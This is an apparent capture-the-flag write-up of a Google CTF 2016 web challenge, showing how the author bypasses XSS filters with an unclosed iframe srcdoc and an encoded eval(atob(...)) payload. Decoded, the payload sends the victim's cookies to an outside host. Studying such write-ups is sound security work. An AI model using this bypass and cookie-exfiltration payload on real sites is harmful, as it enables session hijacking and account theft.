---
source: zlz-buerhaus
source_url: https://buer.haus/2016/05/01/google-ctf-web-2-wallowing-wallabies-part-two
title: "Google CTF – Web 2 – Wallowing Wallabies – Part Two | ziot"
---

[< Back](https://buer.haus/)

**Google CTF - Web 2 - Wallowing Wallabies - Part Two**

Continuing on from [Wallowing Wallabies Part 1](https://buer.haus/2016/05/01/google-ctf-web-1-wallowing-wallabies-part-one).

We now have a new URL /deep-blue-sea/team/vendors/msg with the cookie we received from Part 1. This looks very similar to the first challenge and we can assume that it's a natural progression in XSS. There most likely will be a new level of XSS protection in this challenge versus the lack of any protection in Part 1.

Trying the same attack vector from the first challenge did not work.

\\* <script> is replaced with **anti\*\*hacker\*\***.

\\* <iframe> is replaced with **anti\*\*hacker\*\***.

\\* The src attribute is replaced with **anti\*\*hacker\*\***.

\\* Any "on" attribute such as "onerror=" or "onload=" is replaced.

I used a fairly new XSS vector of <iframe> with no closing > to bypass the first protection. As long as we only used **<iframe** it would not get removed. Instead of using src="", I used srcdoc="" which bypassed the next protection. Now that I have a srcdoc, I am able to use entities which will bypass some of their other checks. Finally, I use eval/base64decode to bypass the rest of the checks.

Payload:

```
<iframe srcdoc="%26lt%3Bimg%20src%26equals%3Bx%3Ax%20onerror%26equals%3Beval%26lpar%3Batob%26lpar%3B%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd3d3LnBvdGF0b3BsYS5uZXQveHNzP2Nvb2tpZT0iK2VuY29kZVVSSShkb2N1bWVudC5jb29raWUpOw%3D%3D%27%26rpar%3B%26rpar%3B%26gt%3B
```

![](https://buer.haus/wp-content/uploads/2016/05/step-2.png)

This appears to have worked in my own browser, but we have to check our access logs to see if their bot loaded it.

![](https://buer.haus/wp-content/uploads/2016/05/step-3.png)

We got another **green-mountains** cookie.

![](https://buer.haus/wp-content/uploads/2016/05/step-31.png)

If our assumption on the URL restriction is right, this should give us access to a different endpoint for the final flag.

```
eyJub25jZSI6ImU1ZjdjN2U1MjE0MzNjNTUiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3R1YW0vY2hhcmFjdGVycy4qJCIsImV4cGlyeSI6MTQ2MTk5NjI4OH0= converts into {"nonce":"e5f7c7e521433c55","allowed":"^/deep-blue-sea/team/characters.*$","expiry":1461996288}
```

Our new cookie should give us access to the /characters endpoint.

![](https://buer.haus/wp-content/uploads/2016/05/step-4.png)

Another flag, another form! This last form leads into Part 3.